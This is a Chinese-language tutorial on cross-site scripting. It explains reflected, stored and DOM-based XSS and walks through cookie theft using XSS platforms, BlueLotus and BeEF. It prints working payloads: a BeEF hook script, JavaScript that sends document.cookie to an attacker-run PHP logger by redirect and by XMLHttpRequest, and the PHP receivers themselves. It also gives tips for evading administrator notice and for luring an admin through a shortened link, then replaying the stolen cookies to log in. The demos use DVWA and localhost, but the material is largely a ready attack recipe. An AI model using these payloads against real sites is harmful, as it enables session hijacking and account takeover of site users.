一：什么是XSS攻击？
===========

XSS 即（Cross Site Scripting）中文名称为：跨站脚本攻击。XSS的重点不在于跨站点，而在于脚本的执行。那么XSS的原理是：恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。那么XSS攻击最主要有如下分类：反射型、存储型、及 DOM-based型。 反射性和DOM-baseed型可以归类为非持久性XSS攻击。存储型可以归类为持久性XSS攻击。

二：简单的工具介绍
=========

短链接简介：
------

通俗来说，就是将长的URL网址，通过程序计算等方式，转换为简短的网址字符串。

短链接：<http://45.runchang.top/>  
EXP:  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4e927a9e8c51e07fe5826e116f26e75d9d4c06ca.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-4e927a9e8c51e07fe5826e116f26e75d9d4c06ca.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ec94b8b684cf2c71591a33f18fd218896f42234c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ec94b8b684cf2c71591a33f18fd218896f42234c.png)  
随后根据短链接进行登录  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3c832c9b8d9e99a12578f38f005a6c64e46a4c9d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3c832c9b8d9e99a12578f38f005a6c64e46a4c9d.png)

XSS平台：
------

在线网址：  
<https://xss.pt/>  
使用方法：  
1，先登录xsser  
[https://xss.pt/，并创建一个新项目](https://xss.pt/%EF%BC%8C%E5%B9%B6%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E9%A1%B9%E7%9B%AE)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8a215860ad677b10e8ee4865ca1a94febbf6f8f3.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8a215860ad677b10e8ee4865ca1a94febbf6f8f3.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-38e2f571553a3184dcc051e4a8621732c7f6eb24.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-38e2f571553a3184dcc051e4a8621732c7f6eb24.png)  
选择一个xss脚本  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e86bed9fb99e4a131959d1fa89d5e0ef0be2a5cc.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e86bed9fb99e4a131959d1fa89d5e0ef0be2a5cc.png)  
将复制的xss脚本语句黏贴到目标网站的留言板上留言，点击提交  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-260ddb533575fc4d536695b34ec220c4dd3af94a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-260ddb533575fc4d536695b34ec220c4dd3af94a.png)  
登录后台网站，并进入留言审核模块，点击未验证  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e85a7050d7ea46b07a5c4420354da256013bff3a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e85a7050d7ea46b07a5c4420354da256013bff3a.png)  
重新回到xsser上，查看刚刚创建的项目内容，就获取其cookie  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b055eed3e6dda21013263f8913c5ab39c3cfcb20.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b055eed3e6dda21013263f8913c5ab39c3cfcb20.png)

自己搭的平台：
-------

我搭的这个平台：BlueLotus\_XSSReceiver 蓝莲花  
平台搭建教程网址：[https://blog.csdn.net/qq\_50854662/article/details/116899239?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_50854662/article/details/116899239?spm=1001.2014.3001.5501)

具体操作：  
网址：[http://127.0.0.1/BlueLotus\_XSSReceiver/admin.php](http://127.0.0.1/BlueLotus_XSSReceiver/admin.php)  
密码：bluelotus  
1,登录界面  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e4c5bc8aab7f94916a5fb9df00213003cc952474.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e4c5bc8aab7f94916a5fb9df00213003cc952474.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-749123a621bfdcb0c1da5979a24d0691bd1b450b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-749123a621bfdcb0c1da5979a24d0691bd1b450b.png)  
2,登录后点击我的JS，取文件名，选择一个模板，点击插入模板  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-95d1f29982b3b7b294f718039bd694022d98f718.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-95d1f29982b3b7b294f718039bd694022d98f718.png)  
3,修改js代码中的网站地址为http://服务器IP地址/index.php 然后点击新增  
即http://127.0.0.1/BlueLotus\_XSSReceiver/index.php  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-71eca840f53a8db59927cf329981c0b69d640d91.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-71eca840f53a8db59927cf329981c0b69d640d91.png)  
4,点击生成payload，将编码复制  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2fb991fd5d073494be68a9e0e0b3eb5dea74d07e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2fb991fd5d073494be68a9e0e0b3eb5dea74d07e.png)  
5,这里用cms文章管理系统作测试  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2f1361aae07c5247aaefb831904dd5e5a2252261.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2f1361aae07c5247aaefb831904dd5e5a2252261.png)  
6,后我们登录后台，点击留言管理，再点击未验证（账号：admin，密码：123456）  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2d61c05272e66a20bc721bbb74315d5d2c77c74f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2d61c05272e66a20bc721bbb74315d5d2c77c74f.png)  
7,之后我们返回蓝莲花界面，发现收到两个cookie  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3ad50620ad32e7f92b89b1550153978f3a82841c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3ad50620ad32e7f92b89b1550153978f3a82841c.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ce01c670712c2997a5925c12e3fe842586fbf144.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ce01c670712c2997a5925c12e3fe842586fbf144.png)

BeEF
----

Browser Exploitation Framework(BeEF)  
BeEF是日前最强大的浏览器开源渗透测试框架,通过X55漏洞配合JS脚本和 Metasploit进行渗透;  
BeEF是基于Ruby语言编写的,并且支持图形化界面,操作简单  
<http://beefproject.com>  
**主要功能：**

```html
信息收集:
1.网络发现
2.主机信息
3.Cookie获取
4.会话劫持
5.键盘记录
6.插件信息

持久化控制:
1.确认弹框
2.小窗口
3.中间人

社会工程:
1.点击劫持
2.弹窗告警
3.虚假页面
4.钓鱼页面

渗透攻击:
1.内网渗透
2.Metasploit
3.CSRF攻击
4.DDOS攻击
```

**BeEF的简单安装**

我这里用kali  
启动Apache服务：service apache2 start  
然后安装Beef工具  
我用脚本安装

```html
命令：
apt-get update
apt-get install beef-xss
apt-get install beef-xss
beef-xss
```

启动之后  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c0b56605876c76e71f7e717e9c1f5c41192dd97c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c0b56605876c76e71f7e717e9c1f5c41192dd97c.png)

```html
Hook: <script src="http://<IP>:3000/hook.js"></script>
```

会弹出来beef的登录窗口  
这边我们在看一下beef绑定的3000端口  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf1a49963bb8e81e617bba26a3739f82ccc4e4a4.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-cf1a49963bb8e81e617bba26a3739f82ccc4e4a4.png)  
发现绑定3000端口的IP是0.0.0.0  
发现是0.0.0.0 监听3000端口  
那么远程也是可以访问的

```html
http://192.168.29.131:3000/ui/authentication
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f468e376fbe5b7a1e3632f13ee3e4fb61daad3fc.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f468e376fbe5b7a1e3632f13ee3e4fb61daad3fc.png)  
查看账号密码（也可进行更改）  
找到配置文件（kali默认在/etc/beef-xss/config.yaml中）；

```html
cat /etc/beef-xss/config.yaml
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ef9c3fbf323fd1b7c167ad6768f7f2bc00a4ba77.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ef9c3fbf323fd1b7c167ad6768f7f2bc00a4ba77.png)

**BeEF-XSS主页面介绍**  
启动BeFF-XSS并登陆进去  
方式一：在命令行中打beef-xss  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bd82412715804d18c2128773ac7c50dfa6b1816e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bd82412715804d18c2128773ac7c50dfa6b1816e.png)  
方式二：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d100ffe4c9326f91cc4e9ec09f9d58d7b653eb1b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d100ffe4c9326f91cc4e9ec09f9d58d7b653eb1b.png)  
启动后的界面  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0fe19110702437ede69b7ad1ae827dffefbc014f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0fe19110702437ede69b7ad1ae827dffefbc014f.png)

**Hocked Browers：**  
online browers 在线浏览器  
offline browers 离线浏览器  
**Detials：**浏览器、插件版本信息，操作系统信息  
**Logs：**浏览器动作：焦点变化，鼠标单击，信息输入  
**commands：**  
绿色模块：表示模块适用当前用户，并且执行结果对用户不可见  
红色模块：表示模块不适用当前用户，有些红色模块也可以执行  
橙色模块：模块可用，但结果对用户可见  
灰色模块：模块为在目标浏览器上测试过  
**payload**  
这里需要把图中红框中的payload复制粘贴到你的目标xss的位置，然后将其中的&lt;IP&gt;改成你这台kali的IP地址，最终payload为：

```html
'<script src="http://X.X.X.X:3000/hook.js"></script>'
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d522a246565e013e2777c301091d4732e6045858.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d522a246565e013e2777c301091d4732e6045858.png)

**BeEF的使用方法**  
这里我们使用DVWA做实验：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-64a0949654a7ed937d672bd03c03e3b8206e200d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-64a0949654a7ed937d672bd03c03e3b8206e200d.png)  
这时候再回到BeEF中查看，会发现online browers中多了点东西  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a2379ea0a57073252b8840c45fadeaf411eeea2e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a2379ea0a57073252b8840c45fadeaf411eeea2e.png)  
打开"current Browsers" 下的"commands",就可以运行模块对目标系统进行入侵。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c7028e3d18b2f156b491d86950ed23101a9ac854.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c7028e3d18b2f156b491d86950ed23101a9ac854.png)  
例子：选择"Brower"下面的"Hooked Domain"的create Alert Dialog（弹窗 ），点击右下角的"execute"运行  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-08bd63236b3d29ac23ae69d17c02394125089c87.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-08bd63236b3d29ac23ae69d17c02394125089c87.png)  
这样我们就能在DVWA上看到弹窗了。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-04345646b21a6f4c422b70e17cb17d50e9851af2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-04345646b21a6f4c422b70e17cb17d50e9851af2.png)  
也可以执行其他操作

如果对BeEF功能想要进一步了解的话，下面这篇文章对于BeEF就讲得很细  
<https://www.freebuf.com/sectool/178512.html>

**也有其他xss利用平台  
比如：XSS Shell, Anehta, CAL9000等可以去学一学**

三：XSS的注入原理
==========

跨站脚本注入漏洞产生的根本原因是由于WEB服务端读取了**用户可控数据输出到HTML页面的过程中没有进行安全处理**导致的。  
用户可控数据:所有来自客户端的数据都可以被客户端控制，**包括url、参数、HTTP头部字段(cookie,referer、HOST等)、请求正文等**都属于用户可控数据。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2193185de904f02817ccac7f08c00ce9657034d5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2193185de904f02817ccac7f08c00ce9657034d5.png)  
**原理分析：**  
输出问题导致的js代码被识别执行

```html
<?php
    $xss=$_GET['x'];
    echo $xss;
//127.0.0.1/test/xss.php?x=<script>alert(1)</script>
//js代码;<script>alert(1)</script> 调用执行
//漏洞产生原理：输出问题
?>
```

**注意：**  
通常XSS注入并不能对服务器产生直接的危害，而是通过攻击客户端(其他用户)来达到攻击目标。

XSS的分类
------

基于用户可控数据的来源和输出的位置，可以将XSS分为三类:  
1、反射型XSS:直接将HTTP请求中的用户可控数据输出到HTML页面中的跨站脚本注入，由于用户可控数据没有被存储，因此只能在单次请求中生效。  
2、存储型XSS:又叫特久型XSS，直接将HTTP请求中的用户可控数据存储至数据库中，再从数据库中读取出来输出到HTML页面上，由于数据经过存储，可以持续被读取，攻击影响面和危害都较高  
3、DOM-XSS:特殊的跨站，将用户可控数据通过JavaScript和DOM技术输出到HTML中，利用方式通常与反射型XSS类似  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5f2a024d5d93cbbe220068468334ea5aa089d0ab.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5f2a024d5d93cbbe220068468334ea5aa089d0ab.png)

### 1、反射型XSS:

反射型XSS也被称为非持久性XSS，当用户访问一个带有XSS代码的HTML请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，就造成XSS漏洞，这个过程就像一次反射，所以叫反射型XSS。  
演示步骤  
1.登录界面  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-281afaa16c3de4cc75cb4485a0f3ff2661464829.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-281afaa16c3de4cc75cb4485a0f3ff2661464829.png)  
我们在账户输入处输入admin，查看源代码，按下ctrl+f来搜索：admin，看出现在哪个位置，来构造特定的payload  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ccdb7bd665dd5507a62eb4a9d791fa9b9b112202.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ccdb7bd665dd5507a62eb4a9d791fa9b9b112202.png)  
查看源码，可以知道是"闭合。所以我们可以构造"&gt;&lt;script&gt;alert(666)&lt;/script&gt;&lt;a把前面的&lt;input闭合掉，让它执行后面的代码。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b725e74fb87a48e0edffaa195840bea4b0dfe284.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b725e74fb87a48e0edffaa195840bea4b0dfe284.png)  
这时代码已经改变它原有的意思了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-85ec4288c718fd65f673f09319786a4b62b996af.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-85ec4288c718fd65f673f09319786a4b62b996af.png)  
构造好代码后把URL变成短链接发送给管理员，管理员点击打开获取他的cookie登录

### 2、存储型XSS:

**存储型XSS**又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本漏洞，当攻击者提交一段XSS代码后，被服务端接收并存储，当攻击者或用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这是存储型XSS.

**操作流程：**  
这里使用DVWA进行操作  
点击留言**(这里最好不要使用`<script>alert("xss")</script>`来测试是否存在XSS漏洞，容易被管理员发现，所以你可以使用``来测试，如果成功了，不会被管理员发现)** OK，我先在留言里输入`<a>s</a>`提交留言，F12打开审查元素，来看我们输入的标签是否被过滤了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c8a58834f067aac749e4810661497c9b9c1906b0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c8a58834f067aac749e4810661497c9b9c1906b0.png)  
发现没有过滤 (如果&lt;a&gt;s&lt;/a&gt;中的&lt;a&gt;&lt;/a&gt;是彩色的说明没有过滤，如果是灰色就说明过滤了)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f652552abcbedab558d3066effb3ee55d8579ad5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-f652552abcbedab558d3066effb3ee55d8579ad5.png)  
这里换成impossible级别就是灰色的，说明被过滤了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d517ad70a6c0d37627044885cf3e2f16c4e32437.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d517ad70a6c0d37627044885cf3e2f16c4e32437.png)  
这里留言板中只留下s，并且s是这样显示的，也说明这里没有过滤  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fb4cd81248e76c0ed8848258522eb3ab05aa00be.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fb4cd81248e76c0ed8848258522eb3ab05aa00be.png)  
这里换成impossible级别就留下&lt;a&gt;s&lt;/a&gt;，说明被过滤了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0b0340cad1e7e40574c1983d5f6a8df8f69570c1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0b0340cad1e7e40574c1983d5f6a8df8f69570c1.png)

### 3、DOM-XSS:

DOM的全称为Document Object Model，即文档对象模型，DOM通常用于代表在HTML、XHTML和XML中的对象。使用DOM可以允许程序和脚本动态地访问和更新文档的内容、结构和样式。  
​ 通过js可以重构整个HTML页面，而要重构页面或者页面中的某个对象，js就需要知道HTML文档中所有元素的“位置”。而DOM为文档提供了结构化表示，并定义了如何通过脚本来访问文档结构。根据DOM规定，HTML文档中的每个成分都是一个节点。

\*\*XSS利用DOM的结构定义

DOM结构是将HTML文件的节点构建成树状结构，以此反应HTML本身的阶层结构。用过构造javascript恶意语句就可以修改HTML的DOM结构中的某个值，从而触发跨站脚本攻击。\*\*

```html
<html>
<head>
<title>DOM XSS</title>
</head>
<body>
<a href="我的链接"/>
<h1>我的标题</h1>
</body>
</html>
```

HTML的标签都是一个个的节点，而这些节点组成了DOM的整体结构：节点树。如图所示：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bf9fec0008d72e91777dff55363aae57898c51cf.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bf9fec0008d72e91777dff55363aae57898c51cf.png)  
简单来说，DOM为一个一个访问html的标准编程接口。  
可以发现DOM本身就代表文档的意思，而基于DOM型的XSS是不需要与服务器端交互的，它只发生在客户端处理数据阶段，是基于javascript的。而上面两种XSS都需要服务端的反馈来构造xss。  
**DOM型XSS示例：**

```html
<script>
var temp = document.URL;  //获取URL
var index = document.URL.indexOf("content=")+4;
var par = temp.substring(index);
document.write(decodeURI(par));  //输入获取内容
</script>
```

上述代码的意思是获取URL中content参数的值，并且输出，如果输入`网址?content=<script>alert(/xss/)</script>`,就会产生XSS漏洞  
这里再举一例：  
这个文件名为1.html

```html
<script>
document.write(document.URL.substring(document.URL.indexOf("a=")+2,document.URL.length));
</script>
```

在这里我先解释下上面的意思：  
Document.write是把里面的内容写到页面里。  
document.URL是获取URL地址。  
substring 从某处到某处，把之间的内容获取。  
document.URL.indexOf("a=")+2是在当前URL里从开头检索a=字符，然后加2(因为a=是两个字符，我们需要把他略去)，同时他也是substring的开始值  
document.URL.length是获取当前URL的长度，同时也是substring的结束值。  
**合起来的意思就是：在URL获取a=后面的值，然后把a=后面的值给显示出来。**  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5be6367c43fc76ca3b7508aae49f8533cfc6837e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5be6367c43fc76ca3b7508aae49f8533cfc6837e.png)

怎么会出现这个问题呢？  
因为当前url并没有`a=`的字符，而`indexOf`的特性是，当获取的值里，如果没有找到自己要检索的值的话，返回-1。找到了则返回0。那么`document.URL.indexOf("a=")`则为-1，再加上2，得1。然后一直到URL最后。这样一来，就把file的f字符给略去了，所以才会出现`ttp://127.0.0.1/123.html`

大致的原理都会了，我们继续下面的  
我们可以在1.html后面加上?a=123或者#a=123，只要不影响前面的路径，而且保证a=出现在URL就可以了。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-139c1ae118110d97e0677218a22eb6ce48c3a4da.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-139c1ae118110d97e0677218a22eb6ce48c3a4da.png)  
我们清楚的看到我们输入的字符被显示出来了。  
那我们输入`<script>alert(666)</script>`会怎么样呢？  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2a79bd398fe92ba10484371a95be9a7447bc6705.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2a79bd398fe92ba10484371a95be9a7447bc6705.png)  
但是这下面没却没有弹窗，这是为什么呢？这是因为浏览器不同，maxthon、firefox、chrome则不行，他们会在你提交数据之前，对url进行编码。这不是说DOM型XSS不行了，这只是个很简单的例子，所以不用在意。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7676e2de4569426d48daf1a260f7ef705542aa46.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7676e2de4569426d48daf1a260f7ef705542aa46.png)  
我再次强调下，DOM型XSS 是基于javascript基础上，而且不与服务端进行交互，他的code对你是可见的，而基于服务端的反射型、存储型则是不可见的。

**利用原理:**  
客户端JS可以访问浏览器的DOM文本对象模型是利用的前提，当确认客户端代码中有DOM型XSS漏洞时，并且能诱使(钓鱼)一名用户访问自己构造的URL，就说明可以在受害者的客户端注入恶意脚本。利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数不用发送到服务器端，可以达到绕过WAF、躲避服务端的检测效果。

**DOM型XSS漏洞演示**  
1.首先我们在输入框中随便输入一串字符。可以看到弹出一个what do you see?的提示。我们查看一下源码  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b821bc8cf5d2b462a53c4b7e3316795a1f80b208.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b821bc8cf5d2b462a53c4b7e3316795a1f80b208.png)  
右击审查元素看看  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7bc39d66ec795145d78cff05688cf64d3817dce2.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7bc39d66ec795145d78cff05688cf64d3817dce2.png)

上图可以看到我们输入的东西会被拼接到a这个标签的href属性中：  
`< a href='"+str+"'>what do you see?</a>`我们要做的事被做成超链接了，我们把他闭合下,构成domxss。执行我们想让它做的事`'onclick="alert('xss')">`于是在前端就变成了这个：`<a href=''onclick="alert('xss')">'>what do you see?</a>`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b9cdf0965008c14a7a15d53034e8d17caf470e4b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b9cdf0965008c14a7a15d53034e8d17caf470e4b.png)

XSS的危害
------

其实归根结底，XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码。  
可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在XSS中除非恶作剧，不然是不会在恶意植入代码中写上alert（“say something”）的。  
**就是将其他漏洞类型与xss打配合，将危害性提高**

### 1.窃取网页浏览中的cookie值

在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。  
如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到document.cookie。  
试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过某些厂商的cookie有其他验证措施如：Http-Only保证同一cookie不能被滥用）

**利用存储型XSS实现手工盗取cookie**

**方法一：**  
Javascript脚本：

```html
<script>document.location="http://127.0.0.1/xss_test/getcookie.php?cookie="+document.cookie;</script>
```

PHP脚本：

```html
<?php
$cookie = $_GET['cookie']; //用get的方式获取cookie
$log = fopen("cookie.txt" , "w");//文件不存在则创建cookie.txt，存在则内容清0
fwrite($log,$cookie);//将$cookie的值写进$log里（$log指的是cookie.txt）
fclose($log);//关闭。如果成功关闭，则该方法返回零。如果失败，则返回 EOF。
echo "攻击成功";
?>
```

实践：  
现在自己的web服务器里写一个getcookie.php的脚本  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ed3c8db284eebdcc75717dd51c3c7e3233a2df75.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ed3c8db284eebdcc75717dd51c3c7e3233a2df75.png)  
随后到一个存在xss注入的留言板中提交

```html
<script>document.location="http://127.0.0.1/xss_test/getcookie.php?cookie="+document.cookie;</script>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-27f9bb3a8f84f01f00ea92a4f39650e9b03ea9e1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-27f9bb3a8f84f01f00ea92a4f39650e9b03ea9e1.png)  
登录后台进行查看留言信息  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1ee5174324cf14b5464adebcc5a9e2192dc1a88c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1ee5174324cf14b5464adebcc5a9e2192dc1a88c.png)  
这时就可以去查看cookie.txt文件了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b05b8198d301d359ad6f0bbf9ff0a0c731773c78.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b05b8198d301d359ad6f0bbf9ff0a0c731773c78.png)  
获取的cookie值  
这时数据库也有了数据  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1edae200865f7f6fccf604f679b78f87973b4802.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1edae200865f7f6fccf604f679b78f87973b4802.png)

**方法二：**  
Javascript脚本：

```html
<script>
var url="http://127.0.0.1/xss_test/postcookie.php";
var data="cookie="+document.cookie;
var nxhr= new XMLHttpRequest();
nxhr.open("POST",url);
nxhr.setRequestHeader("content-type","application/x-www-form-urlencoded");
nxhr.send(data);
</script>
```

PHP脚本：

```html
<?php
date_default_timezone_set("Asia/shanghai");
$cookie = $_POST["cookie"];
$time = date("Y-m-d H:i");
echo $time;
$refer = $_SERVER['HTTP_REFERER'];
$content = $time."::"."$refer"."::".$cookie."\r\n";
file_put_contents("cookie.txt", $content, FILE_APPEND);
?>
```

**实践：**  
现在自己的服务器里写一个postcookie.php  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aaca133eade10f873ade6d6d8b336834ed1181aa.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-aaca133eade10f873ade6d6d8b336834ed1181aa.png)  
随后到一个存在xss注入的留言板中提交

```html
<script>
var url="http://127.0.0.1/xss_test/postcookie.php";
var data="cookie="+document.cookie;
var nxhr= new XMLHttpRequest();
nxhr.open("POST",url);
nxhr.setRequestHeader("content-type","application/x-www-form-urlencoded");
nxhr.send(data);
</script>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a00343f9ebb4993731b253ae59d5342e32c68467.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a00343f9ebb4993731b253ae59d5342e32c68467.png)  
登录后台进行查看留言信息  
查看时有个空白的留言，这时点击F12查看网页源代码，已经写进去了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-eca016acab9eaa4159084b0d1176ba43377ef6bd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-eca016acab9eaa4159084b0d1176ba43377ef6bd.png)  
再去自己的服务器中查看cookie.txt文件，已经有数据了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3e6728a9ddeee9f3a8583281176b1d4c5cbf22de.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3e6728a9ddeee9f3a8583281176b1d4c5cbf22de.png)

**利用cookie进行无密码登录**  
打开登录界面，调出火狐的firebug插件，调至cookie选项卡（注意，如果你的firebug插件没有cookie选项卡，请再安装firecookie插件即可看到）  
然后依次点击cookies-create cookie，随后再弹出的界面中填入两个xss平台获取到的cookie，如图  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d44ff65be21b1ab7a3e3363692800335a27a5a6f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d44ff65be21b1ab7a3e3363692800335a27a5a6f.png)  
这里注意要把我箭头所指的地方勾上，这是设置cookie有效期的地方，不然会在设置完下一秒cookie就失效。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8344ea38a916733d203146e24c09d87a2423f728.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-8344ea38a916733d203146e24c09d87a2423f728.png)  
完成之后再次刷新页面，发现已经不是之前的登录界面了，而是登录后的界面。至此，一个从cookie窃取到利用的过程就已完成。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a49ae85df70729170beeedb7f08d534514c81ab5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-a49ae85df70729170beeedb7f08d534514c81ab5.png)

### 2.劫持流量实现恶意跳转

这个很简单，就是在网页中想办法插入一句像这样的语句：

```html
<script>window.location.href="http://www.baidu.com";</script>
```

那么所访问的网站就会被跳转到百度的首页。  
